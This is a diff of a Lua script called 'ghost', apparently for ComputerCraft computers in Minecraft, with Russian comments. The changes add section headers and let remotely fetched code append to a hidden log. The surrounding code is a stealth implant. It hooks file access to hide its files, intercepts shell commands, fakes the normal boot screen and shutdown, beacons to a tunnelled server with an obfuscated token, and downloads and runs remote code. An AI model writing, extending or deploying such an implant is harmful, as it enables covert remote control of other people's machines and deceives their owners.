@@ -1,4 +1,4 @@
--- ghost v9.9.11 (export _G.glog for pastes + paste_manager fixes)
+-- ghost v9.9.12 (stealth allows append to .ghost.log for pastes)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -81,14 +81,16 @@ local refresh_url
 local check_mode
 local reload_tunnel
 
--- НОВОЕ: glog теперь экспортируется в _G для пастов
+-- ============================================
+-- LOGGING (экспорт в _G для пастов)
+-- ============================================
 local function glog(msg)
     pcall(function()
         local f = orig_fs_open(LOG_FILE, "a")
         if f then local t = os.date and os.date("%H:%M:%S") or "?"; f.write(t .. " " .. tostring(msg) .. "\n"); f.close() end
     end)
 end
-_G.glog = glog  -- ЭКСПОРТ для пастов!
+_G.glog = glog
 
 local function note(msg) glog(msg) end
 local function gerr(step, err)
@@ -100,6 +102,9 @@ local function gerr(step, err)
     if service_local then printError("[Ghost] " .. step .. ": " .. tostring(err)) end
 end
 
+-- ============================================
+-- SELF-UPDATE
+-- ============================================
 local function do_update()
     glog("UPDATE: start")
     term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
@@ -114,6 +119,9 @@ local function do_update()
     glog("UPDATE OK"); sleep(2); orig_reboot(); return true
 end
 
+-- ============================================
+-- STEALTH (v9.9.12: разрешён append к .ghost.log)
+-- ============================================
 local function is_hidden_name(name)
     for _, hf in ipairs(HIDDEN) do if name == hf then return true end end
     if name:find("^%.tmp_") then return true end
@@ -146,6 +154,13 @@ local function install_stealth()
         end
         fs.open = function(path, mode)
             local c = tostring(path):gsub("^/",""):gsub("/$","")
+            
+            -- НОВОЕ в v9.9.12: разрешаем append к .ghost.log для пастов
+            if c == ".ghost.log" then
+                if mode == "a" then return orig_fs_open(path, mode) end
+                return nil  -- read/write запрещены (нельзя прочитать лог)
+            end
+            
             if c == "startup" or is_core(c) then return nil end
             if c == ".server_url" then
                 if mode and (mode:find("w") or mode:find("a")) then return nil end
@@ -219,6 +234,9 @@ local function normal_complete(text)
     return out
 end
 
+-- ============================================
+-- BOOT SCREEN
+-- ============================================
 local MOTD = {'Running "set" lists the current values of all settings.','Type "help" to view the help index.',
     'Use "edit" to create and modify files.','Press Ctrl+T to terminate a running program.',
     'The "alias" command can be used to create custom commands.','You can change the color of text with the "paint" program.',
@@ -245,6 +263,9 @@ local function authentic_shutdown()
     term.clear(); term.setCursorPos(1, 1); print("Goodbye"); orig_shutdown()
 end
 
+-- ============================================
+-- STRIKE ANALYSIS
+-- ============================================
 local function find_hidden(line)
     local l = line:lower()
     for _, hn in ipairs(HIDDEN_NAMES) do if l:find(hn, 1, true) then return hn end end
@@ -269,6 +290,9 @@ end
 local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") end
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
+-- ============================================
+-- URL MANAGEMENT
+-- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w"); if f then f.write(url); f.close() end
 end
@@ -392,6 +416,9 @@ local function acquire_url()
     end
 end
 
+-- ============================================
+-- TOKEN
+-- ============================================
 local function encrypt_token(t)
     local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
     for i = 1, #t do
@@ -436,6 +463,9 @@ load_token = function()
     return read_token_file(TOKEN_BAK)
 end
 
+-- ============================================
+-- MODE
+-- ============================================
 local current_mode = "normal"
 local function load_mode()
     if orig_fs_exists(MODE_FILE) then
@@ -448,6 +478,9 @@ local function save_mode(m)
     local f = orig_fs_open(MODE_FILE, "w"); if f then f.write(m); f.close() end
 end
 
+-- ============================================
+-- HTTP
+-- ============================================
 local function make_headers(token)
     local h = {}
     h["Content-Type"] = "application/json"; h["bypass-tunnel-reminder"] = "true"
@@ -512,6 +545,9 @@ trigger_fortress = function(token)
     if token then send_heartbeat(token, {}) end
 end
 
+-- ============================================
+-- COMMAND INTERCEPT
+-- ============================================
 local function install_command_intercept()
     pcall(function()
         shell.run = function(...)
@@ -561,6 +597,9 @@ local function install_command_intercept()
 end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
+-- ============================================
+-- REGISTRATION
+-- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
     refresh_url()
@@ -611,7 +650,9 @@ local function fetch_paste_code(name, token)
     return r.content
 end
 
--- НОВОЕ: динамический менеджер пастов с улучшенным логированием
+-- ============================================
+-- DYNAMIC PASTES (coroutines)
+-- ============================================
 local active_pastes = {}
 local function paste_runner_loop(name, token)
     glog("paste_runner start: " .. name)
@@ -636,6 +677,9 @@ local function paste_runner_loop(name, token)
     end
 end
 
+-- ============================================
+-- FORTRESS
+-- ============================================
 local function fortress_console()
     draw_boot()
     while true do
@@ -646,6 +690,9 @@ local function fortress_console()
     end
 end
 
+-- ============================================
+-- LOOPS
+-- ============================================
 local function relay_watch_loop(token)
     glog("relay_watch start")
     while true do
@@ -753,6 +800,9 @@ local function paste_manager_loop()
     end
 end
 
+-- ============================================
+-- REPL
+-- ============================================
 local function repl()
     while true do
         if fortress_active then return end
@@ -787,6 +837,9 @@ local function repl()
     end
 end
 
+-- ============================================
+-- BACKGROUND CONNECT
+-- ============================================
 local function connect_and_run(token, pending_password)
     if not token and pending_password and pending_password ~= "" then
         if acquire_url() then
@@ -806,8 +859,11 @@ local function connect_and_run(token, pending_password)
     pcall(parallel.waitForAll, table.unpack(funcs))
 end
 
+-- ============================================
+-- MAIN
+-- ============================================
 local function run_main()
-    glog("ghost start v9.9.11")
+    glog("ghost start v9.9.12")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
